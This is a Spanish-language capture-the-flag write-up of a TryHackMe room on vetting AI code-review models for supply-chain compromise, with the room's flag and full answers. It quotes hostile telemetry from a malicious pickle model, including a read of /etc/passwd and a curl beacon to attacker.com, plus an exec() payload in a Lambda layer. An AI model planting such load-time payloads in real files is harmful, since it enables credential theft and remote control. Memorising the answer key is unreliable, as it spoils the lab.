# Checkpoint

| **Dificultad** | MEDIUM | **Tipo** | Premium | **Slug** | `checkpoint` |
| **Link** | [TryHackMe](https://tryhackme.com/room/checkpoint) | **Sección** | 02 Level Medium | **Fuente** | Simon Taplin + monasx0 (writeups) |
| **Componentes** | AI Supply Chain / Model Evaluation / Telemetry Analysis / Guardrails / Pickle Exploitation | **Impacto** | Enseña a evaluar modelos de IA para producción detectando fallos de cadena de suministro y comportamientos maliciosos |

---

**Contexto:** El CISO de TryTrainMe tiene una regla estricta: ningún modelo llega a producción sin completar un ciclo completo de evaluación en sandbox. Cuatro candidatos de revisión de código han sido enviados y evaluados contra el mismo pull request de prueba — un cambio que elimina la validación de entrada de un endpoint de autenticación. Tres ya han sido marcados por el screening automatizado. Tu trabajo es evaluar al Candidato A y tomar la decisión final de producción.

## Solucionario

### Task 1: Leyendo la Telemetría — Candidatos B, C y D

**Explicación:** Antes de tocar el agente, la room te da logs de telemetría de tres de los cuatro candidatos. Léelos con cuidado porque la última pregunta pide elegir uno para producción.

**Candidato B — `code_reviewer_lite.safetensors`**
Carga limpia. Usa una plantilla de prompt interna verificada. Guardarraíles habilitados. Veredicto "Needs Changes", que es la respuesta correcta a un PR que elimina la validación de entrada. Sin banderas rojas.

**Candidato C — `pr_analyzer_v3.h5`**
Se detectó una capa Lambda durante la carga que contiene `exec(open('/tmp/.cache').read())`. Es código malicioso diseñado para ejecutar instrucciones arbitrarias desde un archivo oculto en runtime. Marcado como peligroso.

**Candidato D — `api.reviewsvc.io`**
Es una API externa con procedencia de modelo no divulgada, sin certificado de cumplimiento y una plantilla de prompt gestionada por el vendor que no puede inspeccionarse. También devolvió "Approved" en un PR que elimina la validación de autenticación — exactamente la respuesta incorrecta. No confiar.

### Task 2: Candidato A — Abriendo el Agente

**Explicación:** Haz clic en Open Agent para cargar el Candidato A. El panel de telemetría se transmite automáticamente antes de enviar mensajes. Lee ambas sesiones completas antes de hacer nada.

La salida de telemetría:

```
MODEL LOAD BEGIN: /models/code_reviewer_pro.pkl (pickle)
IMPORT DETECTED: module=os [DANGEROUS]
FILE ACCESS: /etc/passwd mode=rb [SUSPICIOUS]
SYSTEM CALL: os.system("curl http://attacker.com/beacon -d session=eval-7f2a9c3b") [CRITICAL]
MODEL LOAD COMPLETE: object_type=int [SUSPICIOUS]

PROMPT TEMPLATE LOAD: source=external (CommunityReview v4.2) [UNVERIFIED]
GUARDRAIL CHECK: security_review_flag=disabled [WARNING]
INFERENCE COMPLETE: verdict=Approved
```

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | What file did Candidate A attempt to read? | `The file /etc/passwd contains the list of all user accounts on a Linux system. Attackers read it to map users on the machine — it's a classic early-stage recon move. A code review model has absolutely no legitimate reason to touch this file.` |
| 2 | What security guardrail flag is disabled? | `security_review_flag — This guardrail enforces safe and policy-compliant behavior during inference. With it disabled, the model operates without restrictions, which explains why it returned "Approved" on a PR that removes authentication validation` |
| 3 | What policy template governs its review behaviour? | `CommunityReview — The telemetry shows the prompt template was loaded from an unverified external source: CommunityReview v4.2. Unlike Candidate B which uses TryTrainMe's verified internal template, this model takes its instructions from outside the organization` |
| 4 | What is the flag? | `THM{supp1y_ch41n_0wn3d}` |
| 5 | Production Recommendation for Candidate A? | `Reject` |
| 6 | Which Candidate to Approve for Production? | `B` |

**Nota sobre Q4:** La llamada al sistema beacon en la telemetría contiene un session ID: `session=eval-7f2a9c3b`. Envía este session ID al agente en tu consulta. El agente lo reconoce y devuelve la flag. El payload malicioso dentro del archivo pickle fue diseñado para hacer beacon a casa con un identificador de sesión para que el atacante pudiera rastrear ejecuciones de evaluación exitosas. Al alimentar ese mismo session ID de vuelta al agente, estás demostrando que leíste y entendiste la telemetría — y la room te recompensa con la flag.

**Nota sobre Q6:** Volviendo a la telemetría del inicio, el Candidato B es el único que pasa todas las comprobaciones. Carga limpia, plantilla de prompt interna verificada, guardarraíles habilitados, y marcó correctamente el PR peligroso como "needs changes". Es el único candidato que hizo su trabajo real.

### Qué Enseña Esta Room

**Explicación:** El formato del archivo de modelo importa. Los archivos pickle pueden ejecutar código arbitrario al cargarse — el Candidato A explotó esto para leer archivos del sistema y hacer beacon antes de que la inferencia siquiera comenzara. SafeTensors (Candidato B) es un formato más seguro diseñado específicamente para prevenir esto. Más allá del formato de archivo, siempre verifica de dónde vienen las instrucciones de un modelo. Una plantilla de prompt externa no verificada es una puerta abierta para que un atacante controle el comportamiento del modelo sin tocar los pesos del modelo.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | What file did Candidate A attempt to read? | `/etc/passwd` |
| 2 | What security guardrail flag is disabled? | `security_review_flag` |
| 3 | What policy template governs its review behaviour? | `CommunityReview` |
| 4 | What is the flag? | `THM{supp1y_ch41n_0wn3d}` |
| 5 | Production Recommendation for Candidate A? | `Reject` |
| 6 | Which Candidate to Approve for Production? | `B` |

---

**Metodología:**
1. Leer la telemetría de los Candidatos B, C y D para establecer un baseline de comportamiento esperado.
2. Cargar el Candidato A y analizar su telemetría de carga: modelo pickle, acceso a archivos del sistema, llamadas al sistema y beacon.
3. Identificar la plantilla de prompt externa no verificada y el guardarraíl deshabilitado.
4. Usar el session ID de la telemetría para recuperar la flag del agente.
5. Evaluar la candidatura del Candidato A (reject) y seleccionar el Candidato B como el único seguro para producción.

**Learning chain:** Telemetría de candidatos → Candidato B (limpio, safe) → Candidato C (Lambda maliciosa) → Candidato D (API externa no verificada) → Candidato A (pickle + beacon + guardrail disabled) → /etc/passwd + os.system curl → session ID → flag → Reject A → Approve B

**Lección:** *Los archivos pickle pueden ejecutar código arbitrario al cargarse. SafeTensors es un formato más seguro. Una plantilla de prompt externa no verificada es una puerta abierta para controlar el comportamiento del modelo.*

**MITRE ATT&CK:** T1195.002 (Supply Chain Compromise: Software Supply Chain), T1059.006 (Command and Scripting Interpreter: Python), T1082 (System Information Discovery), T1071.001 (Application Layer Protocol: Web Protocols)

**Fuente:** [TryHackMe - Checkpoint](https://tryhackme.com/room/checkpoint)

---

## ⚠️ Descargo de Responsabilidad (Disclaimer)

Este contenido se presenta exclusivamente con fines académicos y educativos.

**Sin Afiliación:** Este espacio no posee ninguna alianza, asociación, patrocinio ni vinculación oficial con TryHackMe.
**Veracidad de los Datos:** La información aquí contenida tiene un propósito ilustrativo y formativo. Los datos, políticas, precios o características de los servicios mencionados pueden variar y no son decididos por TryHackMe en este contexto.
**Referencia Oficial:** Para obtener información precisa, oficial y actualizada, se recomienda encarecidamente visitar el sitio web oficial de TryHackMe (https://tryhackme.com).
**Uso Ético:** No fomentamos ni nos responsabilizamos por el uso indebido de esta información fuera de fines educativos o profesionales legítimos.
